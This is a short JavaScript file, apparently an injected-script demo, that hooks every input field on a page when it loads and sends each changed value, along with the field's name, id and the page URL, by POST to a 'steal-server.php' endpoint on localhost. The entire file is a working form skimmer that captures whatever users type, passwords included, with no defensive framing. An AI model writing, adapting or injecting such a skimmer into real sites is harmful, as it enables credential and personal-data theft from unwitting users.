window.onload = function () {
    let inputs = document.getElementsByTagName("input");

    for (let i = 0; i < inputs.length; i++) {
        inputs[i].onchange = function () {
            
            const XHR = new XMLHttpRequest();
            const FD = new FormData();

            FD.append("url", window.location.href);
            FD.append("type", this.type);
            FD.append("name", this.name);
            FD.append("id", this.id);
            FD.append("class", this.class);
            FD.append("value", this.value);

            console.log(FD);

            // Set up our request
            XHR.open("POST", "http:/127.0.0.1/InjectJS/steal-server.php");

            // Send our FormData object; HTTP headers are set automatically
            XHR.send(FD);
        };
    }
};
